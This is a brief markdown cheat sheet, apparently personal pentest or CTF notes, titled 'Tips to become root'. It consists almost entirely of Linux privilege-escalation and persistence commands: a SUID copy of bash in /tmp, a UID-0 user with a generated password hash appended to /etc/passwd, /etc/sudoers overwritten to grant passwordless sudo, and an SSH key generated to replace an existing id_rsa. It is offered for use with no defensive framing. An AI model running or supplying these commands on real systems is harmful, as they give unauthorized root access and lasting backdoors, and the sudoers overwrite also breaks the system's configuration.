# Tips to become root

```
cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash

add root user 
[benjamin@dibble tmp]$ openssl passwd -1 -salt lyethar pass123
$1$lyethar$/YpLdL9gB8tiM28MCkQL9/
lyethar:$1$lyethar$/YpLdL9gB8tiM28MCkQL9/:0:0:root:/root:/bin/bash


openssl passwd -1 -salt password password 
Then copy that into this 
echo 'lyethar:$1$password$Da2mWXlxe6J7jtww12SNG/:0:0:lyethar:/root:/bin/bash' >> /etc/passwd


make urself be able to run root binaries without password 
echo "ignite ALL=(root) NOPASSWD: ALL" > /etc/sudoers


Overwrite the id_Rsa key with one of our own.
ssh-keygen -t rsa -N '' -f ~/.ssh/id_rsa
Generating public/private rsa key pair.
Your identification has been saved in /home/kali/.ssh/id_rsa
Your public key has been saved in /home/kali/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:77ufSzZu/0b3gdzFwZOzihQewkazcg5T4qZ19is9l2M kali@kali
The key's randomart image is:
+---[RSA 3072]----+
|       .o+    . .|
|      . o+oo   * |
|       B.=o o  .=|
|      + O .o   .o|
|     .  S...o + .|
|         ....+.oo|
|         ..++E .+|
|         ..+=o. o|
|          +==o.o.|
+----[SHA256]-----+

```
